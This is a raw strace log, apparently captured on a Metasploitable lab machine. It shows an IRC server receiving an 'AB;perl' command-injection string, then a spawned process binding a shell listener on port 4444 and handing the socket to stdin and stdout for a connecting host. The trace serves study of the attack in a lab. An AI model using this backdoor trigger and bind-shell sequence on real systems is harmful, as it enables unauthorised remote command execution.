[RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12711 07:43:45.501623 close(6)          = 0
12711 07:43:45.501634 munmap(0xb7dda000, 4096) = 0
12711 07:43:45.501652 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12711 07:43:45.501666 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12711 07:43:45.501683 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dda000
12711 07:43:45.501693 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12711 07:43:45.501871 close(6)          = 0
12711 07:43:45.501876 munmap(0xb7dda000, 4096) = 0
12711 07:43:45.501876 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
12711 07:43:45.501876 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ef298) = -1 EINVAL (Invalid argument)
12711 07:43:45.501876 _llseek(6, 0, 0xbf8ef2e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12711 07:43:45.501877 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ef298) = -1 EINVAL (Invalid argument)
12711 07:43:45.501877 _llseek(6, 0, 0xbf8ef2e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12711 07:43:45.501877 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
12711 07:43:45.501877 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
12711 07:43:45.501915 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
12711 07:43:45.501945 listen(6, 5)      = 0
12711 07:43:45.501999 accept(6,  <unfinished ...>
12710 07:43:45.502240 exit_group(0)     = ?
12708 07:43:45.502313 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12710
12708 07:43:45.502329 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12708 07:43:45.502340 --- SIGCHLD (Child exited) @ 0 (0) ---
12708 07:43:45.502347 waitpid(-1, 0xbf8383a8, WNOHANG) = -1 ECHILD (No child processes)
12708 07:43:45.502358 sigreturn()       = ? (mask now [])
12708 07:43:45.502374 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12708 07:43:45.502417 exit_group(0)     = ?
4519  07:43:45.502454 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12708
4519  07:43:45.502466 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:43:45.502479 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:43:45.502490 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:43:45.502500 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:43:45.502519 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:43:45.502582 time(NULL)        = 1495626225
4519  07:43:45.502593 time(NULL)        = 1495626225
4519  07:43:45.502612 gettimeofday({1495626225, 502616}, NULL) = 0
4519  07:43:45.502632 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:43:45.502664 clock_gettime(CLOCK_MONOTONIC, {3035, 319677822}) = 0
4519  07:43:45.502677 gettimeofday({1495626225, 502681}, NULL) = 0
4519  07:43:45.502689 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 890000})
4519  07:43:45.609061 clock_gettime(CLOCK_MONOTONIC, {3035, 426081147}) = 0
4519  07:43:45.609082 recv(7, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:43:45.609109 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609127 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609141 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609155 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609169 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609183 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609196 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609209 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609222 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609236 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609249 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609262 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609275 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609288 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609301 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609314 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609327 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609340 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609354 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609368 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609382 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609395 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.609414 gettimeofday({1495626225, 609419}, NULL) = 0
4519  07:43:45.609426 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
12711 07:43:45.703214 <... accept resumed> {sa_family=AF_INET, sin_port=htons(46569), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
12711 07:43:45.703289 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee288) = -1 EINVAL (Invalid argument)
12711 07:43:45.703304 _llseek(8, 0, 0xbf8ee2d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12711 07:43:45.703316 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee288) = -1 EINVAL (Invalid argument)
12711 07:43:45.703326 _llseek(8, 0, 0xbf8ee2d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12711 07:43:45.703336 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
12711 07:43:45.703378 close(6)          = 0
12711 07:43:45.703446 dup(8)            = 6
12711 07:43:45.703459 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ef128) = -1 EINVAL (Invalid argument)
12711 07:43:45.703470 _llseek(6, 0, 0xbf8ef170, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12711 07:43:45.703480 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12711 07:43:45.703499 dup2(6, 1)        = 1
12711 07:43:45.703529 close(6)          = 0
4519  07:43:45.703623 <... select resumed> ) = 1 (in [5], left {0, 910000})
12711 07:43:45.703677 fcntl64(1, F_SETFD, 0 <unfinished ...>
4519  07:43:45.703686 clock_gettime(CLOCK_MONOTONIC,  <unfinished ...>
12711 07:43:45.703691 <... fcntl64 resumed> ) = 0
4519  07:43:45.703713 <... clock_gettime resumed> {3035, 520718284}) = 0
12711 07:43:45.703719 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:43:45.703730 recv(5,  <unfinished ...>
12711 07:43:45.703747 <... ioctl resumed> , 0xbf8ef0f8) = -1 EINVAL (Invalid argument)
4519  07:43:45.703755 <... recv resumed> 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
12711 07:43:45.703761 _llseek(1, 0,  <unfinished ...>
4519  07:43:45.703769 getsockopt(5, SOL_SOCKET, SO_ERROR <unfinished ...>
12711 07:43:45.703774 <... _llseek resumed> 0xbf8ef140, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:43:45.703803 <... getsockopt resumed> , [0], [4]) = 0
12711 07:43:45.703811 dup(8 <unfinished ...>
4519  07:43:45.703827 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0 <unfinished ...>
12711 07:43:45.703836 <... dup resumed> ) = 6
4519  07:43:45.703844 <... send resumed> ) = -1 EPIPE (Broken pipe)
12711 07:43:45.703850 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:43:45.703856 --- SIGPIPE (Broken pipe) @ 0 (0) ---
12711 07:43:45.703883 <... ioctl resumed> , 0xbf8ef128) = -1 EINVAL (Invalid argument)
4519  07:43:45.703896 close(5 <unfinished ...>
12711 07:43:45.703901 _llseek(6, 0,  <unfinished ...>
4519  07:43:45.703907 <... close resumed> ) = 0
12711 07:43:45.703911 <... _llseek resumed> 0xbf8ef170, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:43:45.703922 time( <unfinished ...>
12711 07:43:45.703927 fstat64(6,  <unfinished ...>
4519  07:43:45.703932 <... time resumed> NULL) = 1495626225
12711 07:43:45.703937 <... fstat64 resumed> {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
4519  07:43:45.703951 time( <unfinished ...>
12711 07:43:45.703955 dup2(6, 0 <unfinished ...>
4519  07:43:45.703960 <... time resumed> NULL) = 1495626225
12711 07:43:45.703964 <... dup2 resumed> ) = 0
4519  07:43:45.703974 gettimeofday( <unfinished ...>
12711 07:43:45.703978 close(6 <unfinished ...>
4519  07:43:45.703984 <... gettimeofday resumed> {1495626225, 703982}, NULL) = 0
12711 07:43:45.703989 <... close resumed> ) = 0
4519  07:43:45.703998 select(1024, [2], [], NULL, {0, 0} <unfinished ...>
12711 07:43:45.704020 fcntl64(0, F_SETFD, 0 <unfinished ...>
4519  07:43:45.704027 <... select resumed> ) = 0 (Timeout)
12711 07:43:45.704031 <... fcntl64 resumed> ) = 0
4519  07:43:45.704042 clock_gettime(CLOCK_MONOTONIC,  <unfinished ...>
12711 07:43:45.704047 fcntl64(0, F_SETFD, 0 <unfinished ...>
4519  07:43:45.704053 <... clock_gettime resumed> {3035, 521059481}) = 0
12711 07:43:45.704058 <... fcntl64 resumed> ) = 0
4519  07:43:45.704070 gettimeofday( <unfinished ...>
12711 07:43:45.704075 read(0,  <unfinished ...>
4519  07:43:45.704081 <... gettimeofday resumed> {1495626225, 704078}, NULL) = 0
4519  07:43:45.704096 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 790000})
4519  07:43:45.909165 clock_gettime(CLOCK_MONOTONIC, {3035, 726174028}) = 0
4519  07:43:45.909165 recv(7, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:43:45.909165 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909181 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909196 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909211 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909224 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909238 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909252 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909266 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909279 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909293 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909307 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909320 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909334 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909347 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909361 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909375 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909388 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909402 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909415 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909429 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909443 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909457 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.909473 gettimeofday({1495626225, 909477}, NULL) = 0
4519  07:43:45.909485 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
12711 07:43:46.226942 <... read resumed> "", 4096) = 0
12711 07:43:46.227071 close(8)          = 0
12711 07:43:46.227381 exit_group(0)     = ?
